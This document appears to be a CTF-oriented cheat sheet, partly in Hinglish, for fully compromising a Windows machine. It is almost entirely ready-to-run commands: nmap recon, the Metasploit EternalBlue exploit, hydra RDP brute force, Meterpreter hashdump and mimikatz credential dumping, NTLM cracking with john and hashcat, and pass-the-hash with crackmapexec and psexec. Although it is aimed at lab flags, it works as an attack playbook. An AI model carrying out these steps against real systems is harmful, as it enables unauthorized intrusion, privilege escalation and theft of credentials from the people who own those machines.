# 🪟 WINDOWS FULL PWN: Scan → Exploit → Hash Dump → Flag

---

## PHASE 1: RECON
```bash
nmap -sV -sC -p- -T4 <IP>
```

## PHASE 2: EXPLOIT (pick based on service)
```
Port 445 → EternalBlue (MS17-010)
Port 3389 → RDP brute force
Port 135/139 → RPC/NetBIOS enum
Port 80 → Web app exploit
```

### EternalBlue (Most Common)
```bash
# Check
nmap --script smb-vuln-ms17-010 -p 445 <IP>
# Exploit
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
set LHOST <YOUR_IP>
run
```

### RDP Brute Force
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> rdp -t 4
xfreerdp /v:<IP> /u:admin /p:<cracked_pass>
```

## PHASE 3: METERPRETER POST-EXPLOIT
```bash
meterpreter > getuid                       # current user
meterpreter > sysinfo                      # hostname, OS
meterpreter > hashdump                     # SAM hashes
meterpreter > getsystem                    # try SYSTEM
meterpreter > load kiwi                    # mimikatz
meterpreter > creds_all                    # all credentials
meterpreter > shell                        # CMD shell
```

## PHASE 4: CMD Shell Post-Exploit
```cmd
whoami
hostname
ipconfig
net user
net user administrator
type C:\Users\Administrator\Desktop\flag.txt
dir /s /b C:\*flag*
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
```

## PHASE 5: HASH CRACK (hashdump output se)
```bash
# Format: username:RID:LM:NTLM:::
# NTLM hash crack:
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ntlm.txt
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt
```

## PHASE 6: PASS-THE-HASH (hash crack nahi hua)
```bash
# Crackmapexec
crackmapexec smb <IP> -u Administrator -H <NTLM_HASH>
# PsExec
use exploit/windows/smb/psexec
set SMBUser Administrator
set SMBPass aad3b435:NTLM_HASH_HERE
```

---

## QUICK DECISION:
```
Windows box
  ├─ SMB 445 open? → MS17-010 check → EternalBlue exploit
  ├─ RDP open? → brute force → login
  ├─ Meterpreter? → hashdump + getsystem + load kiwi
  ├─ CMD shell? → whoami, hostname, type flag.txt
  ├─ Hashes mile? → john/hashcat crack
  ├─ Hash crack nahi hua? → Pass-the-Hash (psexec)
  └─ Flag → C:\Users\Administrator\Desktop\flag.txt
```
